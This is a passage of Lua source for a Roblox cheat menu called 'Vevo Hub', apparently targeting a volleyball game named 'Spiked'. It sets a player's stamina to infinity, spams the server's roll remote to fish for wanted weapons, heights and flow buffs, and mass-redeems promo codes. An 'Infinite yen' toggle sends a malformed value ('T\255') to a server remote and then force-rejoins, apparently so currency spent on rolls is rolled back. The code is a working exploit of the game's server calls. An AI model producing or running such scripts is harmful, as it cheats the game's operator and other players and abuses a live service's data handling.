        game:GetService("ReplicatedStorage").Mechanics.Spike:FireServer(unpack(args))
    end
})
Sections.Player:AddToggle('StamToggle', {
    Text = 'Inf Stam',
    Default = false,
    Tooltip = 'Gives infinite stamina',
    Callback = function(Value)
        if Value then
            MyPlayer.PlayerScripts.Stamina.Value = math.huge
        else
            MyPlayer.PlayerScripts.Stamina.Value = 100
        end
	end
})
Sections.Rec:AddToggle('DiveToggle', {
    Text = 'Dive Toggle',
    Default = false,
    Tooltip = 'Enables diving on auto receive',
    Callback = function(Value)
        getgenv().EnableAutoDive = Value
	end
})
function UpdateDropdown(DropdownValue, tablee)
    for key, isSelected in pairs(DropdownValue) do
        if isSelected then
            table.insert(tablee, key)
        end
    end
end
Sections.FirstWeapon:AddDropdown('FirstWeaponsDropdown', {
    Values = WeaponList,
    Default = 1,
    Multi = true,
    Text = 'Weapons',
    Tooltip = 'Choose wanted first weapons',
    Callback = function(Value)
        local FirstWeapons = {}
        UpdateDropdown(Value, FirstWeapons)
    end
})
function FirstWeaponAutoSpin()
    while getgenv().FirstWeaponSpin do
        UpdateDropdown(Options.FirstWeaponsDropdown.Value, FirstWeapons)
        task.wait(0.1)
        if table.find(FirstWeapons, MyPlayer:GetAttribute("WEAPON")) and #FirstWeapons ~= 0 then
            getgenv().FirstWeaponSpin = false
            Toggles.FirstWeaponAutoSpinToggle:SetValue(false)
            print("you got "..MyPlayer:GetAttribute("WEAPON"))
            Library:Notify('you just got '..MyPlayer:GetAttribute("WEAPON"))
            FirstWeapons = {}
            break
        else
            print("                         ROLLED "..MyPlayer:GetAttribute("WEAPON"))
            local args = {
                [1] = "WEAPON"
                }
            game:GetService("ReplicatedStorage").Remotes.Functions.Roll:InvokeServer(unpack(args))
        end
    end
end
Sections.FirstWeapon:AddToggle('FirstWeaponAutoSpinToggle', {
    Text = 'First Weapon AutoSpin',
    Default = false,
    Tooltip = 'Enables AutoSpin',
    Callback = function(Value)
        getgenv().FirstWeaponSpin = Value
        if getgenv().FirstWeaponSpin then
            task.wait(1)
            FirstWeaponAutoSpin()
        end
	end
})
Sections.SecondWeapon:AddDropdown('SecondWeaponsDropdown', {
    Values = WeaponList,
    Default = 1,
    Multi = true,
    Text = 'Weapons',
    Tooltip = 'Choose wanted second weapons',
    Callback = function(Value)
        local SecondWeapons = {}
        UpdateDropdown(Value, SecondWeapons)
    end
})
function SecondWeaponAutoSpin()
    while getgenv().SecondWeaponSpin do
        UpdateDropdown(Options.SecondWeaponsDropdown.Value, SecondWeapons)
        task.wait(0.1)
        if table.find(SecondWeapons, MyPlayer:GetAttribute("WEAPON_2")) and #SecondWeapons ~= 0 then
            getgenv().SecondWeaponSpin = false
            Toggles.SecondWeaponAutoSpinToggle:SetValue(false)
            print("you got "..MyPlayer:GetAttribute("WEAPON_2"))
            Library:Notify('you just got '..MyPlayer:GetAttribute("WEAPON_2"))
            SecondWeapons = {}
            break
        else
            print("                         ROLLED "..MyPlayer:GetAttribute("WEAPON_2"))
            local args = {
                [1] = "WEAPON_2"
                }
            game:GetService("ReplicatedStorage").Remotes.Functions.Roll:InvokeServer(unpack(args))
        end
    end
end
Sections.SecondWeapon:AddToggle('SecondWeaponAutoSpinToggle', {
    Text = 'Second Weapon AutoSpin',
    Default = false,
    Tooltip = 'Enables AutoSpin',
    Callback = function(Value)
        getgenv().SecondWeaponSpin = Value
        if getgenv().SecondWeaponSpin then
            task.wait(1)
            SecondWeaponAutoSpin()
        end
	end
})
Sections.HeightTab:AddDropdown('HeightsDropdown', {
    Values = HeightList,
    Default = 1,
    Multi = true,
    Text = 'Heights',
    Tooltip = 'Choose wanted Heights',
    Callback = function(Option)
        local SelectedHeights = {}
        UpdateDropdown(Option, SelectedHeights)
    end
})
Sections.FlowTab:AddDropdown('FlowTypeDropdown', {
    Values = FlowTypeList,
    Default = 1,
    Multi = true,
    Text = 'Flow Type',
    Tooltip = 'Choose flow type',
    Callback = function(Option)
        UpdateDropdown(Option, SelectedFlowTypes)
    end
})
Sections.FlowTab:AddSlider('MinFlowPercentageSlider', {
    Text = 'Min Flow %',
    Default = 0,
    Min = 0,
    Max = 20,
    Rounding = 1,
    Compact = false,
    Callback = function(Boost)
        getgenv().MinSelectedFlowPercentage = Boost
    end
})
Sections.FlowTab:AddSlider('MaxFlowPercentageSlider', {
    Text = 'Max Flow %',
    Default = 20,
    Min = 0,
    Max = 20,
    Rounding = 1,
    Compact = false,
    Callback = function(Boost)
        getgenv().MaxSelectedFlowPercentage = Boost
    end
})
function HeightSpin()
    while getgenv().HeightSpin do
        UpdateDropdown(Options.HeightsDropdown.Value, SelectedHeights)
        task.wait(0.1)
        local MyProperHeight = ProperHeight(MyPlayer:GetAttribute("HEIGHT"))
        if table.find(SelectedHeights, MyProperHeight) and #SelectedHeights ~= 0 then
            getgenv().HeightSpin = false
            Toggles.HeightSpinToggle:SetValue(false)
            print("you got "..MyProperHeight)
            Library:Notify('you just got '..MyProperHeight)
            SelectedHeights = {}
            break
        else
            print("                         ROLLED "..ProperHeight(MyPlayer:GetAttribute("HEIGHT")))
            local args = {
                [1] = "HEIGHT"
                }
                game:GetService("ReplicatedStorage").Remotes.Functions.Roll:InvokeServer(unpack(args))
        end
    end
end
function FlowSpin()
    while getgenv().FlowSpin do
        task.wait(0.1)
        local flowAttr = MyPlayer:GetAttribute("FLOWBUFF")
        if flowAttr and typeof(flowAttr) == "string" then
            local flowType, percentStr = flowAttr:match("^(%S+)%s+(%d+%.?%d*)%%$")
            local percent = tonumber(percentStr)

            if flowType and percent then
                print("                         ROLLED "..flowAttr)
                

                if table.find(SelectedFlowTypes, flowType) and percent >= getgenv().MinSelectedFlowPercentage and percent <= getgenv().MaxSelectedFlowPercentage then
                    Library:Notify("🎉 Got desired flow: " .. flowAttr)
                    print("you got "..flowAttr)
                    SelectedFlowTypes = {}
                    Toggles.FlowSpinToggle:SetValue(false)
                    getgenv().FlowSpin = false
                    break

                end
            end
        end

        game.ReplicatedStorage.Remotes.Functions.Roll:InvokeServer("FLOWBUFF")
    end
end

Sections.HeightTab:AddToggle('HeightSpinToggle', {
    Text = 'Spin height',
    Default = false,
    Tooltip = 'Enables AutoSpin for height',
    Callback = function(Value)
        getgenv().HeightSpin = Value
        if getgenv().HeightSpin then
            task.wait(0.5)
            HeightSpin()
        end
    end
})
Sections.FlowTab:AddToggle('FlowSpinToggle', {
    Text = 'Spin flow',
    Default = false,
    Tooltip = 'Enables AutoSpin for flow',
    Callback = function(Value)
        getgenv().FlowSpin = Value
        if getgenv().FlowSpin then
            task.wait(0.5)
            FlowSpin()
        end
    end
})
Sections.Info:AddToggle('InfYenToggle', {
    Text = 'Infinite yen',
    Default = false,
    Tooltip = 'Rollback',
    Callback = function(Value)
        local rollbackChk = getgenv().InfYen or false
        getgenv().InfYen = Value
        if getgenv().InfYen then
            while getgenv().InfYen do
                local args = {
                    [1] = "ZONE",
                    [2] = "T\255"
                }  
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Functions"):WaitForChild("Keybind"):InvokeServer(unpack(args))
                task.wait()
                if (getgenv().HeightSpin or getgenv().FirstWeaponSpin or getgenv().SecondWeaponSpin or getgenv().FlowSpin) and (MyPlayer.Backpack.Yen.Value < 1500 or MyPlayer.Backpack.Yen.Value <= getgenv().KeepMoney) then
                    if #game.Players:GetPlayers() <= 1 then
                        MyPlayer:Kick('\nRejoining...')
                        wait()
                        TeleportService:Teleport(game.PlaceId, MyPlayer)
                    else
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, MyPlayer)
                    end
                end
            end
        else
            if rollbackChk then
                local args = {
                    [1] = "ZONE",
                    [2] = "T"
                }  
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Functions"):WaitForChild("Keybind"):InvokeServer(unpack(args))
            end
        end
    end
})
Sections.Info:AddSlider('KeepMoneySlider', {
    Text = 'How much money to keep before rejoining with rollback',
    Default = 1500,
    Min = 0,
    Max = MyPlayer.Backpack.Yen.Value,
    Rounding = 0,
    Compact = false,
    Callback = function(Boost)
        getgenv().KeepMoney = Boost
    end
})

Sections.Info:AddToggle('SpinAllToggle', {
    Text = 'Spin weapons and height',
    Default = false,
    Tooltip = 'Spins weapons and height',
    Callback = function(Value)
        if Value then
            Toggles.HeightSpinToggle:SetValue(true)
            getgenv().HeightSpin = true
            Toggles.FirstWeaponAutoSpinToggle:SetValue(true)
            getgenv().FirstWeaponSpin = true
            Toggles.SecondWeaponAutoSpinToggle:SetValue(true)
            getgenv().SecondWeaponSpin = true
            Toggles.FlowSpinToggle:SetValue(true)
            getgenv().FlowSpin = true
        else
            Toggles.HeightSpinToggle:SetValue(false)
            getgenv().HeightSpin = false
            Toggles.FirstWeaponAutoSpinToggle:SetValue(false)
            getgenv().FirstWeaponSpin = false
            Toggles.SecondWeaponAutoSpinToggle:SetValue(false)
            getgenv().SecondWeaponSpin = false
            Toggles.FlowSpinToggle:SetValue(false)
            getgenv().FlowSpin = false
        end
    end
})

local CodeButton = Sections.Info:AddButton({
    Text = 'Redeem codes',
    Func = function()
            local a = {"SPIKEDMAS", "1MILVISITS", "20KFAVS", "5KLIKES", "SPIKEDPATCH1", "MATCHQUEUES", "SRY4SHUTDOWN", "AUTOSBUGFIXES", "25KFAVS", "10KLIKES", "UPDATE2", "BEACH", "MATCHQUEUES", "HOTFIX1", "10KSUBS", "VALENTINESDAY", "30KFAV", "SEASON1FINALS", "LEAGUEFINALS", "SPIKEDLEAGUE", "UPDATE3", "SLOTS", "ACE", "SLOTFIXES1", "SEASON1FINALS", "SLOTS", "SPIKEDLEAGUE", "UPDATE3", "DATALOSS"}
    
            for _, itemName in pairs(a) do
                game:GetService("ReplicatedStorage").Remotes.Functions.Codes:InvokeServer(itemName)
    
            end
    
    end,
    DoubleClick = false,
    Tooltip = 'Redeem all codes'
})

local RejoinButton = Sections.Player:AddButton({
	Text = 'Rejoin',
	Func = function()
		if #game.Players:GetPlayers() <= 1 then
			MyPlayer:Kick('\nRejoining...')
			wait()
			TeleportService:Teleport(game.PlaceId, MyPlayer)
		else
			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, MyPlayer)
		end
	end,
	DoubleClick = false,
    Tooltip = 'Rejoins the same server'
})
Sections.Info:AddLabel("Your first weapon is " .. MyPlayer:GetAttribute("WEAPON"))
Sections.Info:AddLabel("Your second weapon is " .. MyPlayer:GetAttribute("WEAPON_2"))
Sections.Info:AddLabel("Yen:")
local YenLabel = Sections.Info:AddLabel(MyPlayer.Backpack.Yen.Value .. "¥")
local FlowLabel = Sections.Flow:AddLabel("Flow:"..MyPlayer.Backpack.Flow.Value)
--local WeaponSpinsLabel = Sections.Info:AddLabel("You can afford " .. math.modf(MyPlayer.Backpack.Yen.Value()/2500) .. " weapon spins")
MyPlayer.Backpack.Yen.Changed:Connect(function()
    YenLabel:SetText(MyPlayer.Backpack.Yen.Value .. "¥")
    --WeaponSpinsLabel:SetText("You can afford " .. math.modf(MyPlayer.Backpack.Yen.Value()/2500) .. " weapon spins")
end)
MyPlayer.Backpack.Flow.Changed:Connect(function()
    FlowLabel:SetText("Flow:"..MyPlayer.Backpack.Flow.Value)
end)
Library.KeybindFrame.Visible = true
Sections.Menu:AddButton('Unload', function() Library:Unload() end)
Sections.Menu:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })
Library.ToggleKeybind = Options.MenuKeybind
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })

ThemeManager:SetFolder('Vevo Hub')
SaveManager:SetFolder('Vevo Hub/Spiked')

SaveManager:BuildConfigSection(Tabs['UI Settings'])
ThemeManager:ApplyToTab(Tabs['UI Settings'])

SaveManager:LoadAutoloadConfig()
    
getgenv().MinSelectedFlowPercentage = Options.MinFlowPercentageSlider.Value
getgenv().MaxSelectedFlowPercentage = Options.MaxFlowPercentageSlider.Value
